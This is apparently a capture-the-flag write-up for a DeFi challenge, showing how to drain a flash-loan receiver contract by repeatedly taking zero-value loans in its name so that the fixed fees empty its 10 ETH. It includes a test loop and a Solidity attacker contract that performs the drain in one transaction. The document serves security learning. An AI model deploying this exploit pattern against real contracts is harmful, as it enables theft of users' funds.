# Intro

There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;

# Attack explanation

Our objective is to drain all ETH funds from the user's contract. If we dig the contract, we can find the next function that is providing the loans:

```
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
  uint256 balanceBefore = address(this).balance;
  require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


  require(borrower.isContract(), "Borrower must be a deployed contract");
  // Transfer ETH and handle control to receiver
  borrower.functionCallWithValue(
      abi.encodeWithSignature(
          "receiveEther(uint256)",
          FIXED_FEE
      ),
      borrowAmount
  );

  require(
      address(this).balance >= balanceBefore + FIXED_FEE,
      "Flash loan hasn't been paid back"
  );
}
```

As we see, the address of the borrower is provided by parameter and not by msg.sender. This enables us to take loans for other addresses.

If we see the code of the receiver, we can see that it only checks that the function is called by the pool but it doesn't check who initiated the loan.

```
// Function called by the pool during flash loan
function receiveEther(uint256 fee) public payable {
  require(msg.sender == pool, "Sender must be pool");

  uint256 amountToBeRepaid = msg.value + fee;

  require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");

  _executeActionDuringFlashLoan();

  // Return funds to pool
  pool.sendValue(amountToBeRepaid);
}
```

In order to beat the level, we need to borrow 10 times from the vulnerable sc address, so the fees drain the funds.

# Attack function

If we want to do it in multiple transactions, we can just type:

```
it("Exploit", async function () {
  for (let i = 0; i < 10; i++) {
    await this.pool.flashLoan(
      this.receiver.address,
      ethers.utils.parseEther("0")
    );
  }
});
```

If we want to do it in a single transaction, we can create the following attacker contract:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title AttackerContract
 * @author Juan Farber (github.com/Farber98)
 */
contract AttackerContract {
    constructor(address _poolAddress, address _vulnerableSc) {
        for (uint8 i = 0; i < 10; i++) {
            _poolAddress.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _vulnerableSc,
                    0
                )
            );
        }
    }
}
```
